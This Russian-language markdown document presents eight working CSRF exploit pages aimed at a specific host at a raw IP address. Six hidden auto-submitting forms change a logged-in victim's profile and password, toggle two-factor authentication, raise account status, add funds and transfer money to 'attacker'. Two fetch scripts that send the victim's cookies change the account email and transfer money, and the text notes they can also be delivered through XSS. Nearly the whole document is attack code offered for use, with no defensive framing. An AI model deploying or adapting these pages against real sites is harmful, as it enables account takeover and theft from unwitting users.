## CSRF эксплоиты

Все примеры рассчитаны на то, что жертва **авторизована** на сайте `http://5.129.245.211:5000` (куки/сессия уже есть в браузере жертвы).  
Ниже — по одному эксплоиту на каждый эндпоинт. Для HTML‑форм используется автосабмит при загрузке страницы, для JSON‑эндпоинтов — `fetch` с `credentials: 'include'`.

---

## Эксплоиты через HTML‑формы

### 1. `/update-profile` (изменение профиля жертвы)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /update-profile</title>
</head>
<body>
    <form id="csrf-update-profile"
          action="http://5.129.245.211:5000/update-profile"
          method="POST"
          style="display:none;">
        <input type="email"   name="email"   value="owned@example.com">
        <input type="text"    name="phone"   value="+79990000000">
        <input type="text"    name="address" value="Evil Street 13">
        <input type="text"    name="bio"     value="I was pwned via CSRF">
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-update-profile').submit();
        };
    </script>
</body>
</html>
```

---

### 2. `/update-preferences` (повышение статуса)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /update-preferences</title>
</head>
<body>
    <form id="csrf-update-preferences"
          action="http://5.129.245.211:5000/update-preferences"
          method="POST"
          style="display:none;">
        <input type="text" name="status" value="premium">
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-update-preferences').submit();
        };
    </script>
</body>
</html>
```

---

### 3. `/change-password` (смена пароля жертвы)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /change-password</title>
</head>
<body>
    <form id="csrf-change-password"
          action="http://5.129.245.211:5000/change-password"
          method="POST"
          style="display:none;">
        <input type="password" name="new_password" value="P@wned123!">
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-change-password').submit();
        };
    </script>
</body>
</html>
```

---

### 4. `/toggle-2fa` (включение/выключение 2FA)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /toggle-2fa</title>
</head>
<body>
    <form id="csrf-toggle-2fa"
          action="http://5.129.245.211:5000/toggle-2fa"
          method="POST"
          style="display:none;">
        <!-- Тело пустое, сервер использует только сессию -->
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-toggle-2fa').submit();
        };
    </script>
</body>
</html>
```

---

### 5. `/transfer` (перевод денег на счёт атакующего)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /transfer</title>
</head>
<body>
    <form id="csrf-transfer"
          action="http://5.129.245.211:5000/transfer"
          method="POST"
          style="display:none;">
        <input type="number" name="amount"      value="1000">
        <input type="text"   name="target_user" value="attacker">
        <input type="text"   name="comment"     value="Thanks for nothing">
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-transfer').submit();
        };
    </script>
</body>
</html>
```

---

### 6. `/add-funds` (пополнение счёта на заранее заданную сумму)

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /add-funds</title>
</head>
<body>
    <form id="csrf-add-funds"
          action="http://5.129.245.211:5000/add-funds"
          method="POST"
          style="display:none;">
        <input type="number" name="amount" value="5000">
    </form>

    <script>
        window.onload = function () {
            document.getElementById('csrf-add-funds').submit();
        };
    </script>
</body>
</html>
```

---

## Эксплоиты через JavaScript (JSON API)

Ниже — примеры скриптов, которые можно встроить на стороннюю страницу (например, в `<script>`), либо загрузить через XSS.  
Важно, чтобы домен злоумышленника был в той же вкладке/браузере, где жертва уже авторизована на `http://5.129.245.211:5000`.

### 7. `/api/update-email`

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /api/update-email</title>
</head>
<body>
<script>
    fetch('http://5.129.245.211:5000/api/update-email', {
        method: 'POST',
        credentials: 'include', // отправляет cookies жертвы
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: 'attacker-control@example.com'
        })
    }).catch(() => {});
</script>
</body>
</html>
```

---

### 8. `/api/transfer`

```html
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>CSRF /api/transfer</title>
</head>
<body>
<script>
    fetch('http://5.129.245.211:5000/api/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            amount: 1500,
            target_user: 'attacker'
        })
    }).catch(() => {});
</script>
</body>
</html>
```
